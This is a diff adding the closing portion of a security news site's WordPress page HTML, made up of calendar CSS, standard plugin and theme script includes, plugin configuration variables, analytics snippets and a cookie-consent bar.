+				#tribe-events .tribe-events-grid,
+				#tribe-events .tribe-grid-allday,
+				#tribe-events .tribe-events-grid .tribe-scroller,
+				#tribe-events .tribe-events-grid .tribe-grid-body .column,
+				#tribe-events .tribe-events-grid .tribe-grid-allday .column {
+					border-color: #d2d2d2;
+				}
+
+				.events-archive.events-gridview #tribe-events-content table .type-tribe_events,
+				.tribe-events-shortcode .tribe-events-month table .type-tribe_events {
+					border-color: #e4e4e4;
+				}
+
+				.tribe-events-calendar td.tribe-events-past div[id*="tribe-events-daynum-"],
+				.tribe-events-calendar td.tribe-events-past div[id*="tribe-events-daynum-"] > a {
+					background-color: #d2d2d2;
+				}
+
+				.tribe-events-calendar div[id*="tribe-events-daynum-"],
+				.tribe-events-calendar div[id*="tribe-events-daynum-"] a {
+					background-color: #acacac;
+				}
+
+				.tribe-events-calendar thead th,
+				.tribe-events-grid .tribe-grid-header .tribe-grid-content-wrap .column,
+				.tribe-grid-header {
+					background-color: #464646;
+					border-left-color: #464646;
+					border-right-color: #464646;
+				}
+			
+				#tribe-events td.tribe-events-present div[id*="tribe-events-daynum-"],
+				#tribe-events td.tribe-events-present div[id*="tribe-events-daynum-"] > a {
+					background-color: #5284b5;
+					color: #fff;
+				}
+
+				#tribe-events .tribe-events-grid .tribe-grid-header div.tribe-week-today {
+					background-color: #5284b5;
+				}
+
+				.tribe-grid-allday .tribe-events-week-allday-single,
+				.tribe-grid-body .tribe-events-week-hourly-single,
+				.tribe-grid-allday .tribe-events-week-allday-single:hover,
+				.tribe-grid-body .tribe-events-week-hourly-single:hover {
+					background-color: #5284b5;
+					background-color: rgba( 82, 132, 181, .75 );
+					border-color: #385e83
+				}
+</style>
+<link rel='stylesheet' id='tribe_events-widget-calendar-pro-override-style-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/themes/colormag-pro/tribe-events/pro/widget-calendar.css' type='text/css' media='all' />
+<link rel='stylesheet' id='su-shortcodes-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/shortcodes-ultimate/includes/css/shortcodes.css' type='text/css' media='all' />
+<link rel='stylesheet' id='shortcodes-ultimate-extra-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/shortcodes-ultimate-extra/includes/css/shortcodes.css' type='text/css' media='all' />
+<script type='text/javascript' id='pt-cv-content-views-script-js-extra'>
+/* <![CDATA[ */
+var PT_CV_PUBLIC = {"_prefix":"pt-cv-","page_to_show":"5","_nonce":"211ce83e44","is_admin":"","is_mobile":"","ajaxurl":"https:\/\/securityboulevard.com\/wp-admin\/admin-ajax.php","lang":"","loading_image_src":"data:image\/gif;base64,R0lGODlhDwAPALMPAMrKygwMDJOTkz09PZWVla+vr3p6euTk5M7OzuXl5TMzMwAAAJmZmWZmZszMzP\/\/\/yH\/C05FVFNDQVBFMi4wAwEAAAAh+QQFCgAPACwAAAAADwAPAAAEQvDJaZaZOIcV8iQK8VRX4iTYoAwZ4iCYoAjZ4RxejhVNoT+mRGP4cyF4Pp0N98sBGIBMEMOotl6YZ3S61Bmbkm4mAgAh+QQFCgAPACwAAAAADQANAAAENPDJSRSZeA418itN8QiK8BiLITVsFiyBBIoYqnoewAD4xPw9iY4XLGYSjkQR4UAUD45DLwIAIfkEBQoADwAsAAAAAA8ACQAABC\/wyVlamTi3nSdgwFNdhEJgTJoNyoB9ISYoQmdjiZPcj7EYCAeCF1gEDo4Dz2eIAAAh+QQFCgAPACwCAAAADQANAAAEM\/DJBxiYeLKdX3IJZT1FU0iIg2RNKx3OkZVnZ98ToRD4MyiDnkAh6BkNC0MvsAj0kMpHBAAh+QQFCgAPACwGAAAACQAPAAAEMDC59KpFDll73HkAA2wVY5KgiK5b0RRoI6MuzG6EQqCDMlSGheEhUAgqgUUAFRySIgAh+QQFCgAPACwCAAIADQANAAAEM\/DJKZNLND\/kkKaHc3xk+QAMYDKsiaqmZCxGVjSFFCxB1vwy2oOgIDxuucxAMTAJFAJNBAAh+QQFCgAPACwAAAYADwAJAAAEMNAs86q1yaWwwv2Ig0jUZx3OYa4XoRAfwADXoAwfo1+CIjyFRuEho60aSNYlOPxEAAAh+QQFCgAPACwAAAIADQANAAAENPA9s4y8+IUVcqaWJ4qEQozSoAzoIyhCK2NFU2SJk0hNnyEOhKR2AzAAj4Pj4GE4W0bkJQIAOw==","is_mobile_tablet":"","sf_no_post_found":"No posts found.","lf__separator":"____"};
+var PT_CV_PAGINATION = {"first":"\u00ab","prev":"\u2039","next":"\u203a","last":"\u00bb","goto_first":"Go to first page","goto_prev":"Go to previous page","goto_next":"Go to next page","goto_last":"Go to last page","current_page":"Current page is","goto_page":"Go to page"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/content-views-query-and-display-post-page/public/assets/js/cv.js' id='pt-cv-content-views-script-js'></script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/pt-content-views-pro/public/assets/js/cvpro.min.js' id='pt-cv-public-pro-script-js'></script>
+<script type='text/javascript' id='disqus_count-js-extra'>
+/* <![CDATA[ */
+var countVars = {"disqusShortname":"security-boulevard-1"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/disqus-comment-system/public/js/comment_count.js' id='disqus_count-js'></script>
+<script type='text/javascript' id='leadin-script-loader-js-js-extra'>
+/* <![CDATA[ */
+var leadin_wordpress = {"userRole":"visitor","pageType":"post","leadinPluginVersion":"7.45.4"};
+/* ]]> */
+</script>
+<script async defer id="hs-script-loader" type='text/javascript' src='//js.hs-scripts.com/1628905.js?integration=WordPress' id='leadin-script-loader-js-js'></script>
+<script type='text/javascript' id='cookie-consent-js-extra'>
+/* <![CDATA[ */
+var ctcc_vars = {"expiry":"30","method":"1","version":"1"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/uk-cookie-consent/assets/js/uk-cookie-consent-js.js' id='cookie-consent-js'></script>
+<script type='text/javascript' src='https://secure.gravatar.com/js/gprofiles.js' id='grofiles-cards-js'></script>
+<script type='text/javascript' id='wpgroho-js-extra'>
+/* <![CDATA[ */
+var WPGroHo = {"my_hash":""};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/jetpack/modules/wpgroho.js' id='wpgroho-js'></script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/themes/colormag-pro/js/sticky/jquery.sticky.min.js' id='colormag-sticky-menu-js'></script>
+<script type='text/javascript' id='colormag-news-ticker-js-extra'>
+/* <![CDATA[ */
+var colormag_ticker_settings = {"breaking_news_slide_effect":"up","breaking_news_duration":"7000","breaking_news_speed":"1000"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/themes/colormag-pro/js/news-ticker/jquery.newsTicker.min.js' id='colormag-news-ticker-js'></script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/themes/colormag-pro/js/magnific-popup/jquery.magnific-popup.min.js' id='colormag-featured-image-popup-js'></script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/themes/colormag-pro/js/navigation.min.js' id='colormag-navigation-js'></script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/themes/colormag-pro/js/fitvids/jquery.fitvids.min.js' id='colormag-fitvids-js'></script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/themes/colormag-pro/js/theia-sticky-sidebar/theia-sticky-sidebar.min.js' id='theia-sticky-sidebar-js'></script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/themes/colormag-pro/js/theia-sticky-sidebar/ResizeSensor.min.js' id='ResizeSensor-js'></script>
+<script type='text/javascript' id='colormag-custom-js-extra'>
+/* <![CDATA[ */
+var colormag_load_more = {"tg_nonce":"95dee0f44a","ajax_url":"https:\/\/securityboulevard.com\/wp-admin\/admin-ajax.php"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/themes/colormag-pro/js/colormag-custom.min.js' id='colormag-custom-js'></script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/themes/colormag-pro/js/jquery.mCustomScrollbar.js' id='custom-scrollbar-js-js'></script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/themes/colormag-pro/js/datatables.min.js' id='custom-datatables-js-js'></script>
+<script type='text/javascript' data-cfasync="false" src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/dflip/assets/js/dflip.min.js' id='dflip-script-js'></script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/jetpack/_inc/build/twitter-timeline.min.js' id='jetpack-twitter-timeline-js'></script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-includes/js/jquery/ui/core.min.js' id='jquery-ui-core-js'></script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-includes/js/jquery/ui/position.min.js' id='jquery-ui-position-js'></script>
+<script type='text/javascript' id='popup-maker-site-js-extra'>
+/* <![CDATA[ */
+var pum_vars = {"version":"1.12.0","pm_dir_url":"https:\/\/securityboulevard.com\/wp-content\/plugins\/popup-maker\/","ajaxurl":"https:\/\/securityboulevard.com\/wp-admin\/admin-ajax.php","restapi":"https:\/\/securityboulevard.com\/wp-json\/pum\/v1","rest_nonce":null,"default_theme":"1793628","debug_mode":"","disable_tracking":"","home_url":"\/","message_position":"top","core_sub_forms_enabled":"1","popups":[],"page":"1839370","gmt_offset":"-4","server_timezone":"America\/New_York"};
+var ajaxurl = "https:\/\/securityboulevard.com\/wp-admin\/admin-ajax.php";
+var pum_sub_vars = {"ajaxurl":"https:\/\/securityboulevard.com\/wp-admin\/admin-ajax.php","message_position":"top"};
+var pum_popups = {"pum-1858808":{"disable_on_mobile":true,"disable_on_tablet":true,"custom_height_auto":true,"scrollable_content":false,"position_from_trigger":false,"position_fixed":true,"overlay_disabled":true,"stackable":true,"disable_reposition":true,"close_on_form_submission":false,"close_on_overlay_click":false,"close_on_esc_press":false,"close_on_f4_press":false,"disable_form_reopen":false,"disable_accessibility":false,"triggers":[{"type":"auto_open","settings":{"cookie_name":["pum-1858808"],"delay":"5000"}}],"cookies":[{"event":"on_popup_close","settings":{"name":"pum-1858808","key":"","session":false,"time":"1 day","path":true}}],"theme_id":"1793628","size":"custom","responsive_min_width":"0px","responsive_max_width":"100px","custom_width":"200px","custom_height":"380px","animation_type":"slide","animation_speed":"350","animation_origin":"bottom","open_sound":"none","custom_sound":"","location":"right bottom","position_top":"100","position_bottom":"10","position_left":"0","position_right":"10","zindex":"1999999999","close_button_delay":"3000","close_on_form_submission_delay":"0","theme_slug":"default-theme","id":1858808,"slug":"doe-virtual"}};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/pum/pum-site-scripts.js?defer&#038;generated=1601641343&#038;ver=1.12.0' id='popup-maker-site-js'></script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/popup-maker/assets/js/vendor/mobile-detect.min.js' id='mobile-detect-js'></script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-includes/js/hoverIntent.min.js' id='hoverIntent-js'></script>
+<script type='text/javascript' id='megamenu-js-extra'>
+/* <![CDATA[ */
+var megamenu = {"timeout":"300","interval":"100"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/megamenu/js/maxmegamenu.js' id='megamenu-js'></script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-includes/js/wp-embed.min.js' id='wp-embed-js'></script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/gravityforms/js/jquery.json.min.js' id='gform_json-js'></script>
+<script type='text/javascript' id='gform_gravityforms-js-extra'>
+/* <![CDATA[ */
+var gf_global = {"gf_currency_config":{"name":"U.S. Dollar","symbol_left":"$","symbol_right":"","symbol_padding":"","thousand_separator":",","decimal_separator":".","decimals":2},"base_url":"https:\/\/securityboulevard.com\/wp-content\/plugins\/gravityforms","number_formats":[],"spinnerUrl":"https:\/\/securityboulevard.com\/wp-content\/plugins\/gravityforms\/images\/spinner.gif"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/gravityforms/js/gravityforms.min.js' id='gform_gravityforms-js'></script>
+<script type='text/javascript' src='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/gravityforms/js/placeholders.jquery.min.js' id='gform_placeholder-js'></script>
+
+<!-- Shortcodes Ultimate custom CSS - start -->
+<style type="text/css">
+.su-posts-default-loop { 
+	margin-left: 15px !important;
+	padding-left: 15px !important;
+}
+
+.su-posts-default-loop .su-post {
+	margin-bottom: 1.5em;
+	line-height: 1.2 !important;
+}
+.su-column-centered {
+     margin-top: 10px;
+}
+</style>
+<!-- Shortcodes Ultimate custom CSS - end -->
+<script type='text/javascript' src='https://stats.wp.com/e-202043.js' async='async' defer='defer'></script>
+<script type='text/javascript'>
+	_stq = window._stq || [];
+	_stq.push([ 'view', {v:'ext',j:'1:9.0.2',blog:'133346385',post:'1839370',tz:'-4',srv:'securityboulevard.com'} ]);
+	_stq.push([ 'clickTrackerInit', '133346385', '1839370' ]);
+</script>
+			
+				<script type="text/javascript">
+					jQuery(document).ready(function($){
+												if(!catapultReadCookie("catAccCookies")){ // If the cookie has not been set then show the bar
+							$("html").addClass("has-cookie-bar");
+							$("html").addClass("cookie-bar-bottom-bar");
+							$("html").addClass("cookie-bar-bar");
+													}
+																	});
+				</script>
+			
+			<div id="catapult-cookie-bar" class=""><div class="ctcc-inner "><span class="ctcc-left-side">Our website uses cookies. By continuing to browse the website you are agreeing to our use of cookies. For more information on how we use cookies and how you can disable them,  <a class="ctcc-more-info-link" tabindex=0 target="_blank" href="https://securityboulevard.com/privacy-policy/">please read our Privacy Policy.</a></span><span class="ctcc-right-side"><button id="catapultCookie" tabindex=0 onclick="catapultAcceptCookies();">I Accept.</button></span></div><!-- custom wrapper class --></div><!-- #catapult-cookie-bar --></body>
+</html>
